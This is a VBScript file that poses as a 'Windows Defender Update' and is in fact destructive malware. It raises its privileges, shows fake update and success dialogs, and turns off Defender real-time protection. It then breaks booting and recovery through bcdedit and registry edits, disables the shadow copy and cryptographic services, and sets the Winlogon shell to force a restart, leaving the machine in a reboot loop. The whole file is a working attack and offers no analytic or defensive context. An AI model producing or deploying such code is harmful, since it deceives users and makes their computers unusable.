Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' Check admin
If Not objFSO.FileExists("C:\Windows\System32\config\SAM") Then
    objShell.Run "powershell -Command Start-Process wscript.exe -ArgumentList '" & WScript.ScriptFullName & "' -Verb RunAs", 0, True
    WScript.Quit
End If

answer = MsgBox("Windows Defender Update KB5007653" & vbCrLf & vbCrLf & _
                "This update improves antivirus protection." & vbCrLf & _
                "Install now?", vbYesNo + vbQuestion, "Security Update")

If answer = vbNo Then
    MsgBox "Update skipped. Protection may be reduced.", vbExclamation, "Warning"
    WScript.Quit
End If

MsgBox "Installing... Do not interrupt.", vbInformation, "Windows Defender"

' Disable Defender temporarily
objShell.Run "cmd /c powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true", 0, True

' Corrupt boot
objShell.Run "cmd /c bcdedit /set {default} recoveryenabled no", 0, True
objShell.Run "cmd /c bcdedit /set {default} bootstatuspolicy ignoreallfailures", 0, True
objShell.Run "cmd /c bcdedit /deletevalue {default} safeboot", 0, True
objShell.Run "cmd /c reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager"" /v BootExecute /t REG_MULTI_SZ /d ""autocheck autochk * /k:C *"" /f", 0, True
objShell.Run "cmd /c reg add ""HKLM\SYSTEM\CurrentControlSet\Control\CrashControl"" /v CrashDumpEnabled /t REG_DWORD /d 0 /f", 0, True
objShell.Run "cmd /c reg add ""HKLM\SYSTEM\CurrentControlSet\Services\VSS"" /v Start /t REG_DWORD /d 4 /f", 0, True
objShell.Run "cmd /c reg add ""HKLM\SYSTEM\CurrentControlSet\Services\CryptSvc"" /v Start /t REG_DWORD /d 4 /f", 0, True
objShell.Run "cmd /c reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v Shell /t REG_SZ /d ""cmd.exe /c shutdown /r /f /t 5"" /f", 0, True

' Restart
objShell.Run "cmd /c shutdown /r /f /t 5", 0, True
MsgBox "Update successful. Restarting in 5 seconds.", vbInformation, "Complete"
